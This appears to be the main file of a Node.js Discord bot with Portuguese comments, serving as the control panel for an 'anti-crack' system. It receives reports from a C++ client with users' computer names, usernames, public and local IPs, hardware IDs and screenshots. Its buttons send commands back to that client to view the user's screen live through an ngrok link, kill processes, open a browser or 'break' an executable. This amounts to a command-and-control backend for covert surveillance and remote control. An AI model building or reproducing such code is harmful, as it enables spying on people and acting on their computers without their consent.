const fs = require("fs");
const colour = require("colour");
const http = require("http");
const {
  Client,
  Collection,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
} = require("discord.js");
const config = require("./config.json");
const wio = require("wio.db");
const axios = require("axios");

const botconfig1 = new wio.JsonDatabase({ databasePath: "database/botConfig.json" });

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

client.commands = new Collection();

const functions    = fs.readdirSync("./functions").filter((f) => f.endsWith(".js"));
const eventsFiles  = fs.readdirSync("./events").filter((f) => f.endsWith(".js"));
const commandFolders = fs.readdirSync("./commands");

const BOT_HTTP_PORT  = 3000;
const CPP_COMMAND_PORT = 8888; // MUDADO DE 3001 PARA 8888

// sessionId → { browsers: [...] }
const activeSessions = new Map();
module.exports.activeSessions = activeSessions;

// ── Embed de alerta ───────────────────────────────────────────────────────────
function buildAlertEmbed(message) {
  const isAlert = message.includes("ALERTA DE SEGURANÇA");
  if (isAlert) {
    const lines = message.split("\n").filter((l) => l.trim() !== "");
    const embed = new EmbedBuilder()
      .setTitle("🚨 ALERTA DE SEGURANÇA — TENTATIVA DE CRACK")
      .setColor(0xff0000)
      .setTimestamp();

    const fields = [];
    const motivoLine = lines.find((l) => l.startsWith("Motivo:"));
    const dataLine   = lines.find((l) => l.startsWith("Data/Hora:"));
    if (motivoLine) embed.setDescription(`**${motivoLine.trim()}**`);
    if (dataLine)   fields.push({ name: "🕐 Data/Hora", value: dataLine.replace("Data/Hora:", "").trim(), inline: true });

    const fieldMap = {
      "• Nome do Computador:": "💻 Computador",
      "• Usuário:":            "👤 Usuário",
      "• Sistema Operacional:":"🖥️ Sistema",
      "• Arquitetura:":        "⚙️ Arquitetura",
      "• HWID:":               "🔑 HWID",
      "• IP Público:":         "🌐 IP Público",
      "• IPs Locais:":         "📡 IPs Locais",
      "• Processo:":           "📂 Processo",
      "• PID:":                "🔢 PID",
    };
    for (const [key, label] of Object.entries(fieldMap)) {
      const line = lines.find((l) => l.includes(key));
      if (line) {
        const value = line.substring(line.indexOf(key) + key.length).trim();
        fields.push({ name: label, value: value || "N/A", inline: true });
      }
    }
    const extraStart = lines.findIndex((l) => l.includes("Dados Adicionais"));
    if (extraStart !== -1) {
      const extraLines = lines.slice(extraStart + 1).join("\n");
      if (extraLines.trim()) fields.push({ name: "📋 Dados Adicionais", value: extraLines.trim(), inline: false });
    }
    embed.addFields(fields);
    embed.setFooter({ text: "Sistema de Segurança do Painel" });
    return embed;
  } else {
    return new EmbedBuilder()
      .setTitle("✅ Painel Iniciado")
      .setDescription(message)
      .setColor(0x00c853)
      .setTimestamp()
      .setFooter({ text: "Sistema de Segurança do Painel" });
  }
}

// ── Envia alerta via API REST ─────────────────────────────────────────────────
async function processAlert(payload) {
  const message          = payload.content    || "";
  const screenshotBase64 = payload.screenshot || null;
  const sessionId        = payload.sessionId  || null;
  const browsers         = payload.browsers   || []; // lista de navegadores detectados

  const logChannelId = botconfig1.get("logsAntiCrack") || botconfig1.get("logs");
  if (!logChannelId) throw new Error("Canal não configurado. Use /botconfig > Canal Anti-Crack");

  const isAlert = message.includes("ALERTA DE SEGURANÇA");
  
  // Se for mensagem com link do ngrok, enviar direto sem embed
  if (message.includes("🌐 Link para visualizar tela:")) {
    const channel = await client.channels.fetch(logChannelId);
    await channel.send(message);
    console.log(`[Alert] ✅ Link ngrok enviado para canal ${logChannelId}`);
    return;
  }
  
  const embed   = buildAlertEmbed(message);
  const url     = `https://discord.com/api/v10/channels/${logChannelId}/messages`;
  const headers = { Authorization: `Bot ${config.token}`, "Content-Type": "application/json" };

  let components = [];
  if (isAlert && sessionId) {
    activeSessions.set(sessionId, { browsers });

    // Linha 1: botões de ação
    const row1 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`openBrowser_${sessionId}`)
        .setLabel("🌐 Abrir Navegador")
        .setStyle(ButtonStyle.Primary),
      new ButtonBuilder()
        .setCustomId(`breakExe_${sessionId}`)
        .setLabel("💥 Quebrar EXE")
        .setStyle(ButtonStyle.Danger),
      new ButtonBuilder()
        .setCustomId(`killProcess_${sessionId}`)
        .setLabel("🔴 Fechar Processo")
        .setStyle(ButtonStyle.Secondary)
    );
    
    // Linha 2: botão de visualização de tela
    const row2 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`viewScreen_${sessionId}`)
        .setLabel("🖥️ Ver Tela (Link Web)")
        .setStyle(ButtonStyle.Success),
      new ButtonBuilder()
        .setCustomId(`stopScreen_${sessionId}`)
        .setLabel("⏹️ Parar Visualização")
        .setStyle(ButtonStyle.Secondary)
    );
    
    components = [row1.toJSON(), row2.toJSON()];
  }

  const body = { embeds: [embed.toJSON()], components };

  if (screenshotBase64) {
    const FormData = require("form-data");
    const form = new FormData();
    form.append("payload_json", JSON.stringify({ ...body, attachments: [{ id: 0, filename: "screenshot.png" }] }));
    form.append("files[0]", Buffer.from(screenshotBase64, "base64"), { filename: "screenshot.png", contentType: "image/png" });
    await axios.post(url, form, { headers: { Authorization: `Bot ${config.token}`, ...form.getHeaders() } });
  } else {
    await axios.post(url, body, { headers });
  }

  console.log(`[Alert] ✅ Enviado para canal ${logChannelId}`);
}

// ── Envia comando para o C++ ──────────────────────────────────────────────────
async function sendCommand(sessionId, action, extra = {}) {
  try {
    await axios.post(`http://127.0.0.1:${CPP_COMMAND_PORT}/command`, {
      action,
      sessionId,
      ...extra,
    }, { timeout: 60000 }); // 60 segundos para operações longas (download ngrok, etc)
  } catch (error) {
    // Melhorar mensagem de erro
    if (error.code === 'ECONNREFUSED') {
      throw new Error(`connect ECONNREFUSED 127.0.0.1:${CPP_COMMAND_PORT}\n\n⚠️ **POSSÍVEIS CAUSAS:**\n1. Runtime.exe não está rodando\n2. Porta ${CPP_COMMAND_PORT} está em uso por outro processo\n3. Múltiplas instâncias do Runtime.exe estão rodando\n\n**SOLUÇÃO:**\n• Execute \`DIAGNOSTICO_PORTA.bat\` na pasta c++\n• Depois execute Runtime.exe novamente`);
    } else if (error.code === 'ETIMEDOUT') {
      throw new Error(`timeout of 60000ms exceeded\n\n⚠️ O painel C++ não respondeu a tempo.\n**Verifique se o painel está travado ou congelado.**`);
    } else {
      throw error;
    }
  }
}

// ── Fila de alertas antes do bot estar pronto ─────────────────────────────────
const pendingAlerts = [];
let botReady = false;

// ── Servidor HTTP — recebe alertas do C++ ─────────────────────────────────────
const httpServer = http.createServer((req, res) => {
  if (req.method !== "POST" || req.url !== "/alert") {
    res.writeHead(404);
    return res.end();
  }
  let body = "";
  req.on("data", (chunk) => (body += chunk));
  req.on("end", async () => {
    try {
      const payload = JSON.parse(body);
      if (!botReady) {
        pendingAlerts.push(payload);
        res.writeHead(202);
        return res.end(JSON.stringify({ queued: true }));
      }
      await processAlert(payload);
      res.writeHead(200);
      res.end(JSON.stringify({ ok: true }));
    } catch (err) {
      console.error("[Alert] Erro:", err.message);
      res.writeHead(500);
      res.end(JSON.stringify({ error: err.message }));
    }
  });
});

httpServer.listen(BOT_HTTP_PORT, "127.0.0.1", () => {
  console.log(`[Alert Server] Escutando em http://127.0.0.1:${BOT_HTTP_PORT}`.cyan);
});

client.once("ready", async () => {
  botReady = true;
  if (pendingAlerts.length > 0) {
    console.log(`[Alert] Processando ${pendingAlerts.length} alerta(s) na fila`.cyan);
    for (const p of pendingAlerts) {
      await processAlert(p).catch((e) => console.error("[Alert] Erro na fila:", e.message));
    }
    pendingAlerts.length = 0;
  }
});

// ─────────────────────────────────────────────────────────────────────────────

(async () => {
  for (const file of functions) {
    require(`./functions/${file}`)(client);
  }
  client.handleEvents(eventsFiles, "./events");
  client.handleCommands(commandFolders, "./commands");
  client.login(config.token);
})();

process.on("uncaughtException", (error, origin) => {
  console.log(`🚫 Erro Detectado:\n\n` + error, origin);
});
process.on("uncaughtExceptionMonitor", (error, origin) => {
  console.log(`🚫 Erro Detectado:\n\n` + error, origin);
});
